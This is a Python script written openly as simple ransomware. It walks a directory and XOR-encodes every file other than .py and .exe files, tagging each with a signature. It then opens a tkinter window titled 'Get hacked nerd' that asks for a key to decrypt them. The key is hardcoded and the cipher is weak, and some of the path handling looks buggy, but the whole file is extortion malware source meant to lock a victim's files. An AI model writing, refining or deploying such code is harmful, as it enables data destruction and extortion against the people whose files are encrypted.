import tkinter as tk
import string
import os

directoryStartInfection = "START_DIRECTORY"
correctKey = "test"
letters = list(string.ascii_lowercase)
signature = b"L{'&"

def FindLetterIndexOnList(letter=str):
    if letter in letters:
        return letters.index(letter)
    return False

def GetNumberToMultiplyFor(key=str):
    key = key.lower()
    number = 0
    for i in range(len(key)):
        character = key[i]
        index = FindLetterIndexOnList(character)
        if index:
            number = number + index
    if number == 0:
        return 1
    return number

def GetNumberToDivideFor(key=str):
    key = key.lower()
    number = 0
    for i in range(len(key)):
        character = key[i]
        index = FindLetterIndexOnList(character)
        if index:
            number = number + index
    if number == 0:
        return 1
    return number

def WriteFileWithContent(content, path):
    with open(path, "wb") as file:
        file.write(content)
    print("wrote file")

def EncodeFile(key, path):
    print("encoding file " + path)
    outputPath = path
    with open(path, "rb") as file:
        newContent = bytearray()
        key_int = GetNumberToMultiplyFor(key)
        print("multiplier is " + str(key_int))
        content = file.read()
        if content.endswith(signature):
            return
        print("first byte is " + str(content[0]))
        for byte in content:
            result = byte ^ key_int
            newContent.append(result)
        newContent.extend(signature)
        WriteFileWithContent(newContent, outputPath)
    print("encoded file")

def DecodeFile(key, path):
    outputPath = path
    with open(path, "rb") as file:
        newContent = bytearray()
        key_int = GetNumberToDivideFor(key)
        print("divider is " + str(key_int))
        content = file.read()
        if not content.endswith(signature):
            return
        content = content[:-len(signature)]
        for byte in content:
            result = byte ^ key_int
            newContent.append(result)
        WriteFileWithContent(newContent, outputPath)
    print("decoded file")

ignoreFileExtensions = [".py", ".exe"]

def ShouldIgnore(fileName):
    for ignoredExtension in ignoreFileExtensions:
        if fileName.endswith(ignoredExtension):
            return True
    return False

def InfectDir(dir):
    for file in os.listdir(dir):
        if os.path.isfile(file):
            if not ShouldIgnore(file):
                EncodeFile(correctKey, file)
        elif os.path.isdir(file):
            InfectDir(file)
    print("finished infecting directory " + dir)

def DecodeDir(dir):
    for file in os.listdir(dir):
        if os.path.isfile(file):
            if not ShouldIgnore(file):
                DecodeFile(correctKey, file)
        elif os.path.isdir(file):
            DecodeDir(file)
    print("finished decoding directory " + dir)

def StartTrade(dir):
    widget = tk.Tk()
    widget.title("Get hacked nerd")
    label = tk.Label(widget)
    label.configure(text="Enter key to decrypt files")
    label.pack(padx=10, pady=30)
    entry = tk.Entry(widget)
    entry.pack(padx=10, pady=10)
    def GetAttempt():
        return entry.get()
    def Clicked():
        attempt = GetAttempt()
        if attempt == correctKey:
            widget.destroy()
            DecodeDir(dir)
        else:
            label.configure(text="Incorrect key!")
    submit = tk.Button(widget, text="submit", command=Clicked)
    submit.pack(padx=10, pady=5)
    widget.wm_attributes('-toolwindow', 'True')
    widget.mainloop()

InfectDir(directoryStartInfection)
StartTrade(directoryStartInfection)
